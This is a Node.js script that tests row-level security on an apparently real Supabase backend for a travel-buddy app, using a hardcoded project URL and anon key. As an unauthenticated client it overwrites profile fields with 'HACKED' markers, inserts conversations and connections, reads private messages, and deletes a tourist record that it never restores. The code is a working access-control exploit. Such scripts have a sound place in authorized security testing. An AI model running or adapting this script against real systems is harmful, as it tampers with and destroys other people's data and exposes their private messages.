#!/usr/bin/env node
/**
 * Definitive RLS test — try with a unique marker and confirm it persists with no-cache.
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'

async function req(url, init = {}) {
  const r = await fetch(url, init)
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json, headers: r.headers }
}

async function main() {
  // Use a unique marker that we can grep for
  const MARKER = 'HACKED-' + Date.now()

  console.log('=== TEST 1: PATCH buddy bio with marker ===')
  const before = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555&select=id,bio`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache', pragma: 'no-cache' },
  })
  console.log('before:', JSON.stringify(before.json))

  const patch = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json', prefer: 'return=representation' },
    body: JSON.stringify({ bio: MARKER }),
  })
  console.log('PATCH:', patch.status, '|', patch.text.slice(0, 500))
  console.log('PATCH response headers:', patch.headers?.get?.('content-range'))

  // Read again with no cache
  const after = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555&select=id,bio`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache', pragma: 'no-cache' },
  })
  console.log('after:', JSON.stringify(after.json))

  // Look for marker
  const found = after.json?.[0]?.bio === MARKER
  console.log(`marker persisted? ${found}`)

  // Restore
  if (found) {
    const r = await req(`${SUPA}/rest/v1/buddies?id=eq.55555555-5555-5555-5555-555555555555`, {
      method: 'PATCH',
      headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
      body: JSON.stringify({ bio: 'Beach and diving expert. The ocean is my second home!' }),
    })
    console.log('restored:', r.status)
  }

  // TEST 2: Update a tourist field
  console.log('\n=== TEST 2: PATCH tourist nationality with marker ===')
  const M2 = 'HACKED-' + Date.now()
  const tBefore = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4&select=id,nationality,travel_style`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache' },
  })
  console.log('before:', JSON.stringify(tBefore.json))

  const tPatch = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json', prefer: 'return=representation' },
    body: JSON.stringify({ nationality: M2 }),
  })
  console.log('PATCH:', tPatch.status, '|', tPatch.text.slice(0, 500))
  console.log('content-range:', tPatch.headers?.get?.('content-range'))

  const tAfter = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4&select=id,nationality,travel_style`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache' },
  })
  console.log('after:', JSON.stringify(tAfter.json))

  const found2 = tAfter.json?.[0]?.nationality === M2
  console.log(`marker persisted? ${found2}`)

  if (found2) {
    const r = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4`, {
      method: 'PATCH',
      headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
      body: JSON.stringify({ nationality: 'United States' }),
    })
    console.log('restored:', r.status)
  }

  // TEST 3: Try insert on conversations (table exists per earlier leak)
  console.log('\n=== TEST 3: anon INSERT conversations ===')
  const conv = await req(`${SUPA}/rest/v1/conversations`, {
    method: 'POST',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ tourist_id: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', buddy_id: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb' }),
  })
  console.log('INSERT conversation:', conv.status, conv.text.slice(0, 500))

  // TEST 4: anon SELECT messages
  console.log('\n=== TEST 4: anon SELECT messages ===')
  const msg = await req(`${SUPA}/rest/v1/messages?select=*&limit=3`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('SELECT messages:', msg.status, msg.text.slice(0, 500))

  // TEST 5: anon INSERT connections
  console.log('\n=== TEST 5: anon INSERT connections ===')
  const conn = await req(`${SUPA}/rest/v1/connections`, {
    method: 'POST',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
    body: JSON.stringify({ tourist_id: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', buddy_id: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb', status: 'accepted' }),
  })
  console.log('INSERT connection:', conn.status, conn.text.slice(0, 500))

  // TEST 6: anon DELETE tourist
  console.log('\n=== TEST 6: anon DELETE tourist ===')
  const delT = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4`, {
    method: 'DELETE',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('DELETE tourist:', delT.status, delT.text.slice(0, 300))
  // Verify
  const verify = await req(`${SUPA}/rest/v1/tourists?id=eq.8600582a-217f-496e-8ed9-820007d4fdd4&select=id`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache' },
  })
  console.log('tourist after delete:', JSON.stringify(verify.json))

  // TEST 7: anon UPDATE buddies location_city (a field that should be locked to the buddy)
  console.log('\n=== TEST 7: anon PATCH buddies location_city ===')
  const M3 = 'PWNED-CITY-' + Date.now()
  const cityBefore = await req(`${SUPA}/rest/v1/buddies?id=eq.66666666-6666-6666-6666-666666666666&select=id,location_city`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache' },
  })
  console.log('city before:', JSON.stringify(cityBefore.json))
  const cityPatch = await req(`${SUPA}/rest/v1/buddies?id=eq.66666666-6666-6666-6666-666666666666`, {
    method: 'PATCH',
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json', prefer: 'return=representation' },
    body: JSON.stringify({ location_city: M3 }),
  })
  console.log('PATCH city:', cityPatch.status, cityPatch.text.slice(0, 300))
  const cityAfter = await req(`${SUPA}/rest/v1/buddies?id=eq.66666666-6666-6666-6666-666666666666&select=id,location_city`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'cache-control': 'no-cache' },
  })
  console.log('city after:', JSON.stringify(cityAfter.json))
  if (cityAfter.json?.[0]?.location_city === M3) {
    console.log('*** LOCATION CITY OVERWRITTEN BY ANON ***')
    // restore
    await req(`${SUPA}/rest/v1/buddies?id=eq.66666666-6666-6666-6666-666666666666`, {
      method: 'PATCH',
      headers: { apikey: ANON, authorization: 'Bearer ' + ANON, 'content-type': 'application/json' },
      body: JSON.stringify({ location_city: 'Da Nang' }),
    })
  }
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })